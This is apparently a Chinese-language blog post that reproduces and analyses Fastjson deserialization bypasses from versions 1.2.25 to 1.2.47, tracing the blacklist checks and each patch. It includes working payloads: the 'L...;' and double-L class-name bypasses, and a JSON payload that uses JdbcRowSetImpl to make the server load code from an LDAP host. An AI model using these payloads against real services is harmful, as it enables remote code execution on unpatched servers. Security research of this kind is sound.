---
title: 复现及分析fastjson后续漏洞
date: 2020-12-16 16:02:30
tags: 复现 漏洞分析
---




# FastJson1.2.25 修复了1.2.24的漏洞但是有绕过需要 autoTypeSupport设置为true


## 环境 在1.2.24的环境下修改pom.xml 版本为1.2.25  

我们再次使用 ldap的payload试试  


![报错没有执行成功](img/2020-12-14-15-07-35.png)  


报错 autoType不支持 `com.sun.rowset.JdbcRowSetImpl`  


我们debug到 checkAutoType方法  
checkAutoType机制是从1.2.25开始的  
autoTypeSupport 默认为false 是黑名单

`com.alibaba.fastjson.parser.ParserConfig#checkAutoType`  

默认autoTypeSupport为false   
![默认autoTypeSupport为false.jpg](img/默认autoTypeSupport为false.jpg)  

默认黑名单机制匹配 黑名单 `this.denyList`  
![默认黑名单机制匹配.jpg](img/默认黑名单机制匹配.jpg)  



黑名单命中 `com.sun.`  

![黑名单命中.jpg](img/黑名单命中.jpg)  

所以有上面的报错没执行成功  


1.2.25 黑名单如下  

![](img/2020-12-14-15-40-29.png)


那我们设置下 autoTypeSupport为true  

```java
    public JSONObject testVuln(@RequestBody String data) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSONObject obj = JSON.parseObject(data);
        JSONObject result = new JSONObject();
```
可以看到走到白名单匹配上则loadClass 但白名单为空  

true后白名单为空  
![true后白名单为空.jpg](img/true后白名单为空.jpg)

并且还是会走到黑名单  

![true还是会走到黑名单判断.jpg](img/true还是会走到黑名单判断.jpg)


再这个限制下可以根据黑名单绕过 与此同时在 `TypeUtils.loadClass` 发现了可以通过前面加L 后面加;来绕过  

![LoadClass](img/2020-12-14-15-19-28.png)  
类名开头是L 结尾是分号 就去掉L和分号后load  
可以看到只要 开头是L 结尾是; 就可以绕过
但是需要开启 autoTypeSupport 才可以  
不然还是会报错不支持  
![L与分号实现绕过.jpg](img/L与分号实现绕过.jpg)   

首先L和;会绕过黑名单  



然后从`1.2.42`后修复了这个可能存在问题的问题(需要开启autoType)  

## 怎么修复的 (L开头 ;结尾 需要autoType的)  
加入开头和结尾是L和; 那么就将头和尾去掉 再进行黑名单验证  
![](img/2020-12-14-16-57-31.png)  


并且将黑名单验证变成了hash的方式 防止安全人员进行研究  

![denyhashcodes](img/2020-12-14-16-30-44.png)  



## 绕过上面的 对于这个去掉L和；的绕过 就是再加一层就可以了  
只是在原来的基础上加了一个去掉L和;  
`LLcom.sun.rowset.JdbcRowSetImpl;;`  

![1.2.42双L绕过.jpg](img/1.2.42双L绕过.jpg)  



## 对于上面这个的补丁  
如果开头有两个LL就会抛出异常  


## 网上别人写好的解出来的 黑名单
`https://github.com/LeadroyaL/fastjson-blacklist`  
我们后面的检测是利用了这个黑名单  

## Fastjson1.2.45 绕过黑名单 是使用黑名单没有的  

这里需要安装额外的库 mybatis  
mybatis也是比较常用的库了 orm框架    
```xml
<dependency>
    <groupId>org.mybatis</groupId>
    <artifactId>mybatis</artifactId>
    <version>3.5.5</version>
</dependency>
```

触发的话还是需要开启 autotype  
我的fastjson是 1.2.42 ~ 1.2.45版本  
进入checkAutoTye  
![checkAutoType](img/2020-12-16-10-46-37.png)  

## <1.2.47 无需开启autoType


### payload

```json
{    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:1389/Exploit",
        "autoCommit":true
    }
}
```

这个是利用了 fastjson解析的时候会先把反序列的化的缓存类对象到 mappings  

先发一个 请求  

```json
{
    "@type":"java.lang.Class",
    "val":"com.sun.rowset.JdbcRowSetImpl"
}
```

先进入checkAutoType 因为没有匹配黑名单可以过去  
![checkAutoType](img/2020-12-16-10-55-57.png)  

使用TypeUtils.loadClass 加载类  
![TypeUtils.loadClass](img/2020-12-16-11-02-18.png)  


从mappings缓存中获取发现没有于是添加进去  
![从mappings缓存中获取](img/2020-12-16-11-03-29.png)  
mappings 是在反序列化中处理一些基础类提供效率  


![添加到mappings缓存](img/2020-12-16-11-40-00.png)  

在 checkAutoType 方法中会有先通过下面方法从mappings中加载  
会先于黑名单过滤  
clazz = TypeUtils.getClassFromMapping(typeName);  

![从mappings中加载](img/2020-12-16-11-52-26.png)

可以看到可以成功加载  
![加载成功](img/2020-12-16-11-58-16.png)  


后面就是跟之前的一样了  
![lookup](img/2020-12-16-11-59-06.png)  

无需autoType因为通过缓存形式绕过了  

## 判断流程
先判断 `autoTypeSupport` 是否为false  
false默认的则进行黑名单判断  
为true则进行白名单 空的加黑名单判断  
当为false的时候第二步会从mappings中获取缓存 有的话直接loadClass   
` Class<?> clazz = TypeUtils.getClassFromMapping(typeName);`  
然后再进入黑名单判断

### 参考 

https://blog.csdn.net/weixin_36024829/article/details/112499108  
https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/  
https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/  


